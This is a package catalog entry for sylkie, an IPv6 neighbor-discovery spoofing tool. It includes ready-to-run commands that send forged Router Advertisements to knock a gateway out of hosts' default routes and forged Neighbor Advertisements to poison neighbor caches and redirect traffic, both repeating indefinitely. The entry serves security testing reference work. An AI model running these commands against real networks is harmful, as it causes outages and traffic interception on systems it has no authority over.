---
name: "sylkie"
categories:
  - blackarch-spoof
version: "0.0.4.r3.g1cf170f"
homepage: "https://github.com/dlrobertson/sylkie"
packaged-by: [blackarch]
blackarch-builddate: "2023-04-16"
build-system: cmake
license: MIT
meta-checked: "2026-11-09"
github-repo: "dlrobertson/sylkie"
github-stars: 53
github-pushed: "2018-07-15"
github-archived: false
github-issues: 10
github-match: "exact"
gh-checked: "2026-11-07"
worth: 2.3
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# sylkie

> IPv6 neighbor-discovery attack tool — forged Router Advertisements that drop a router from default routes, and forged Neighbor Advertisements that poison the neighbor cache.

## What it's for

Tests IPv6 address-spoofing vulnerabilities over the Neighbor Discovery Protocol, the v6 analogue of ARP attacks. The `ra` (router-advert) subcommand sends forged Router Advertisements that make targeted nodes remove a given router/prefix from their default-route list — an IPv6 denial of service. The `na` (neighbor-advert) subcommand sends forged Neighbor Advertisements that overwrite the link-layer address cached for a target IPv6 address, redirecting its traffic to a MAC you choose — the v6 equivalent of ARP cache poisoning. Both take full control of the advertised identities, timing (`--timeout`) and repetition (`--repeat`, `-1` = forever), and long parameter sets can be saved to JSON or plaintext files and replayed. Linux-only, uses raw sockets: run as root or with the setuid bit set (the packaged build enables setuid).

## Typical use cases

### Knock a router out of a host's default routes

```bash
sudo sylkie ra -i ens3 \
  --target-mac 52:54:00:e3:f4:06 \
  --router-ip fe80::b95b:ee1:cafe:9720 \
  --prefix 64 \
  --repeat -1 --timeout 10
```

Outcome: forged Router Advertisements go to the link-local all-nodes address (`ff02::1`) every 10 seconds, indefinitely; nodes that accept them remove `fe80::b95b:ee1:cafe:9720/64` (link-layer `52:54:00:e3:f4:06`) from their default routes and lose that gateway.

### Poison a host's neighbor cache entry

```bash
sudo sylkie na -i ens3 \
  --dst-mac 52:54:00:e3:f4:06 \
  --src-ip fe80::61ad:fda3:3032:f6f4 \
  --dst-ip fe80::b95b:ee1:cafe:9720 \
  --target-ip fe80::61ad:fda3:3032:f6f4 \
  --target-mac 52:54:00:c2:a7:7c \
  --repeat -1 --timeout 3
```

Outcome: the destination host (`--dst-ip`) updates its neighbor cache so `--target-ip` maps to `--target-mac` — traffic meant for the target now lands on the attacker-controlled MAC, repeated every 3 seconds until stopped.

### Replay a saved attack from a file

```bash
sudo sylkie -j run.json
```

Outcome: the JSON file's `router-advert` (or `neighbor-advert`) array — the same options as the CLI, e.g. `{"interface": "ens3", "target-mac": "...", "router-ip": "...", "prefix": 64, "repeat": -1, "timeout": 10}` — is loaded and the adverts start immediately; `sylkie -x cmds.txt` does the same from a plaintext file holding the exact subcommand line.

*No corpus evidence — derived from upstream documentation.*
